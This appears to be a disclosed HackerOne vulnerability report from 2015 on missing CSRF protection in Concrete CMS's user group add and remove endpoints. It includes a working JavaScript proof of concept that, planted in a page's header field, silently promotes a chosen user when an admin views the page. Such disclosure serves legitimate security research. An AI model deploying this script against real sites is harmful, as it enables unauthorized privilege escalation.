---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '64184'
original_report_id: '64184'
title: No csrf protection on index.php/ccm/system/user/add_group, index.php/ccm/system/user/remove_group
weakness: Cross-Site Request Forgery (CSRF)
team_handle: concretecms
created_at: '2015-05-28T17:58:01.319Z'
disclosed_at: '2015-08-26T20:03:22.151Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# No csrf protection on index.php/ccm/system/user/add_group, index.php/ccm/system/user/remove_group

## Metadata

- HackerOne Report ID: 64184
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: concretecms
- Disclosed At: 2015-08-26T20:03:22.151Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

crayons

There is no csrf protection on index.php/ccm/system/user/add_group, and index.php/ccm/system/user/remove_group. 



A malicious POST request can be constructed to add or remove group membership from arbitrary users, if a logged-in admin surfs to a compromised site.

For example, a registered user who has access to edit a given page (say, a blog post) could add the following javascript to the "Extra Header Content" section of the page's SEO module:

<!-- 
<script language="JavaScript" type="text/javascript">
 
     window.onload = promoteUser();
 
     function promoteUser() {
       var XHR = new XMLHttpRequest();
       var urlEncodedData = "";
       var urlEncodedDataPairs = [];
       var name;
       var data = {gID:'3', uID:'8'}; //sub uID for whatever uID you want to promote
 
       for(name in data) {
         urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
       } //end for(name in data)
 
       urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');
 
       XHR.addEventListener('load', function(event){
         //alert boxes for testing purposes only
         //alert('Yeah! Data sent and response loaded.');
         });
 
       XHR.addEventListener('error', function(event){
         //alert boxes for testing purposes only
         //alert('Oops. Something went wrong.');
         });
 
       XHR.open('POST', 'http://<<site>>/concrete5/index.php/ccm/system/user/add_group');
// alt:  XHR.open('POST', // 'http://<<site>>/concrete5/index.php/ccm/system/user/remove_group');

       XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
       XHR.setRequestHeader('Content-Length', urlEncodedData.length);
 
       XHR.send(urlEncodedData);
 
     }//end promoteUser
</script>

-->

As an aside, I'm not sure whether allowing any user to add javascript to the "Extra Header Content" field of a page's SEO module counts as XSS or not, since it seems like a feature, albeit one that could be abused.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
